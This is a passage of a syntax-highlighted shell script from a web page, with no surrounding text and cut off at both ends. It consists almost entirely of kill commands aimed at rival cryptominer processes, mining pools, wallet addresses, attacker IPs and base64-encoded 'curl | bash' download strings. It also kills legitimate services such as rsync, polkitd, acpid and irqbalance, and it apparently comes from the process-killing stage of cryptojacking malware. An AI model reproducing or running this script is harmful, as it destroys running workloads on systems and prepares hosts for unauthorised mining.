$2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AkMK4A2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AJ2AkKe&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HiPxCJRS&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC030&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC031&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC032&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;http_0xCC033&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;C4iLM4L&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aziplcr72qjhzvin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | awk <span class="string">&#x27;&#123; if(substr($11,1,2)==&quot;./&quot; &amp;&amp; substr($12,1,2)==&quot;./&quot;) print $2 &#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/boot/vmlinuz&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;i4b503a52cc5&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;dgqtrcst23rtdi3ldqk322j2&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;2g0uv7npuhrlatd&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;nqscheduler&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;rkebbwgqpl4npmm&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;]&quot;</span> | awk <span class="string">&#x27;$3&gt;10.0&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;2fhtu70teuhtoh78jc5s&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;0kwti6ut420t&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;44ct7udt0patws3agkdfqnjm&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v <span class="string">&quot;/&quot;</span> | grep -v <span class="string">&quot;-&quot;</span> | grep -v <span class="string">&quot;_&quot;</span> | awk <span class="string">&#x27;length($11)&gt;19&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;\[^&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;rsync&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;watchd0g&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | egrep <span class="string">&#x27;wnTKYg|2t3ik|qW3xT.2|ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;158.69.133.18:8220&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;/tmp/java&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;gitee.com&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/java&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;104.248.4.162&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;89.35.39.78&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/dev/shm/z3.sh&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kthrotlds&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ksoftirqds&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netdns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;watchdogs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kdevtmpfsi&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kinsing&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;redis2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line"><span class="comment">#ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi | awk &#x27;$3&gt;80.0&#123;print $2&#125;&#x27; | xargs -I % kill -9 %</span></span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot; ps&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;sync_supers&quot;</span> | cut -c 9-15 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&quot;cpuset&quot;</span> | cut -c 9-15 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;x]&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot;sh] &lt;&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep -v aux | grep <span class="string">&quot; \[]&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/l.sh&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/zmcat&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;CnzFVPLF&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;CvKzzZLs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aziplcr72qjhzvin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/udevd&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;sustse&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;sustse3&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;mr.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;mr.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;2mr.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;2mr.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;cr5.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;cr5.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;logo9.jpg&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;logo9.jpg&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;j2.conf&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;luk-cpu&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;luk-cpu&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ficov&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;ficov&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;he.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;he.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;miner.sh&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;miner.sh&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nullcrew&#x27;</span> | grep <span class="string">&#x27;wget&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nullcrew&#x27;</span> | grep <span class="string">&#x27;curl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;107.174.47.156&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;83.220.169.247&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.203.146&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;144.217.45.45&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;107.174.47.181&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;176.31.6.16&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;mine.moneropool.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;pool.t00ls.ru&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:8080&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:3333&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;zhuabcn@yahoo.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;monerohash.com&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;/tmp/a7b104c270&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:6666&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:7777&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmr.crypto-pool.fr:443&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;stratum.f2pool.com:8888&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;xmrpool.eu&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep -v grep | grep <span class="string">&quot;kieuanilam.me&quot;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep xiaoyao | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps auxf | grep xiaoxue | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">&#x27;46.243.253.15&#x27;</span> | grep <span class="string">&#x27;ESTABLISHED\|SYN_SENT&#x27;</span> | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | sed -e <span class="string">&quot;s/\/.*//g&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">&#x27;176.31.6.16&#x27;</span> | grep <span class="string">&#x27;ESTABLISHED\|SYN_SENT&#x27;</span> | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | sed -e <span class="string">&quot;s/\/.*//g&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f L2Jpbi9iYXN | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f xzpauectgr | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f slxfbkmxtd | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mixtape | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f addnj | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 200.68.17.196 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mwyumwdbpq.conf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f honvbsasbf.conf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f mqdsflm.cf | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f lower.sh | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./ppp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f cryptonight | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./seervceaess | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servceaess | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servceas | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./servcesa | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./vsp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./jvs | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./pvv | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./vpp | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./pces | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./rspce | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./haveged | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./jiba | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./watchbog | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ./A7mA5gb | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kacpi_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kswap_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kauditd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kpsmoused_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kseriod_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kthreadd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ksoftirqd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kintegrityd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f jawa | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f oracle.jpg | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 188.209.49.54 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 181.214.87.241 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f servim | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f kblockd_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f native_svc | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f ynn | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 65ccEJ7 | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f jmxx | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f 2Ne80nA | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f sysstats | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f systemxlv | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f watchbog | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pgrep -f OIcJi1m | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">pkill -f biosetjenkins</span><br><span class="line">pkill -f Loopback</span><br><span class="line">pkill -f apaceha</span><br><span class="line">pkill -f cryptonight</span><br><span class="line">pkill -f mixnerdx</span><br><span class="line">pkill -f performedl</span><br><span class="line">pkill -f JnKihGjn</span><br><span class="line">pkill -f irqba2anc1</span><br><span class="line">pkill -f irqba5xnc1</span><br><span class="line">pkill -f irqbnc1</span><br><span class="line">pkill -f ir29xc1</span><br><span class="line">pkill -f conns</span><br><span class="line">pkill -f irqbalance</span><br><span class="line">pkill -f crypto-pool</span><br><span class="line">pkill -f XJnRj</span><br><span class="line">pkill -f mgwsl</span><br><span class="line">pkill -f pythno</span><br><span class="line">pkill -f jweri</span><br><span class="line">pkill -f lx26</span><br><span class="line">pkill -f NXLAi</span><br><span class="line">pkill -f BI5zj</span><br><span class="line">pkill -f askdljlqw</span><br><span class="line">pkill -f minerd</span><br><span class="line">pkill -f minergate</span><br><span class="line">pkill -f Guard.sh</span><br><span class="line">pkill -f ysaydh</span><br><span class="line">pkill -f bonns</span><br><span class="line">pkill -f donns</span><br><span class="line">pkill -f kxjd</span><br><span class="line">pkill -f Duck.sh</span><br><span class="line">pkill -f bonn.sh</span><br><span class="line">pkill -f conn.sh</span><br><span class="line">pkill -f kworker34</span><br><span class="line">pkill -f kw.sh</span><br><span class="line">pkill -f pro.sh</span><br><span class="line">pkill -f polkitd</span><br><span class="line">pkill -f acpid</span><br><span class="line">pkill -f icb5o</span><br><span class="line">pkill -f nopxi</span><br><span class="line">pkill 